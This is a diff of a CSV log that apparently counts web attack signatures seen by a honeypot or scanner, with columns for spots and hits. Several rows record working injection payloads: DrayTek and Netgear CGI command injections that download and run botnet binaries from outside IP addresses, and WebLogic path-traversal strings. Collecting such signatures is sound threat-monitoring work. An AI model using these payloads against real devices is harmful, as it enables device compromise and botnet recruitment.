@@ -82,7 +82,7 @@ Signature,Spots,Hits
 /cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F108.174.62.168%2FHilix.sh+%3B+chmod+777+Hilix.sh+%3B+sh+Hilix.sh&loginUser=a&loginPwd=a,4,5
 /_cat/indices,4,4
 /include/exportUser.php,4,4
-//console/css/%252e%252e%252fconsolejndi.portal,3,29
+//console/css/%252e%252e%252fconsolejndi.portal ,3,29
 /druid/indexer/v1/sampler,3,5
 /password_change.cgi,3,4
 /sntpcfg.cgi,3,3
@@ -102,8 +102,8 @@ Signature,Spots,Hits
 /str/showcase.action,2,2
 /goform/formSysCmd,2,2
 /gbr.php,2,2
-/admin/cms/login.action,2,2
 /portal/home.jsp,2,2
+/admin/cms/login.action,2,2
 /system/sharedir.php,2,2
 /auth/change,2,2
 /auth,2,2
@@ -357,13 +357,13 @@ HTTP/1.1,1,1
 /system,1,1
 /setup.cgi%3Fnext_file%3Dnetgear.cfg%26todo%3Dsyscmd%26cmd%3Drm+-rf+%2Ftmp%2F*%3Bwget+http%3A%2F%2F107.172.249.3%2Fbins%2Fsora.mips+-O+%2Ftmp%2Fnetgear%3Bsh+netgear%26curpath%3D%2F%26currentsetting.htm%3D1,1,1
 /service/v1/createUser,1,1
-/v1.35/containers/create,1,1
 /goform/formWsc,1,1
+/v1.35/containers/create,1,1
 /_config/query_servers/hvkfnjff,1,1
 /_config/query_servers/hqatiuy,1,1
 /cgibin/mainfunction.cgi&action=login&keyPath=cd%20/tmp;%20wget%20http://103.133.111.238/draytek%20-O%20.draytek;%20chmod%20+x%20.draytek;%20sh%20.draytek;%20rm%20-rf%20.draytek&loginUser=a&loginPwd=a,1,1
-/gbrgbr.php,1,1
 /cgibin/mainfunction.cgi&action=login&keyPath=cd%20/tmp;%20wget%20http://103.133.111.238/anon%20-O%20.anon;%20chmod%20+x%20.anon;%20sh%20.anon;%20rm%20-rf%20.anon&loginUser=a&loginPwd=a,1,1
+/gbrgbr.php,1,1
 /.wgetrc,1,1
 /console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal,1,1
 /images/..%2Fapply_abstract.cgi,1,1
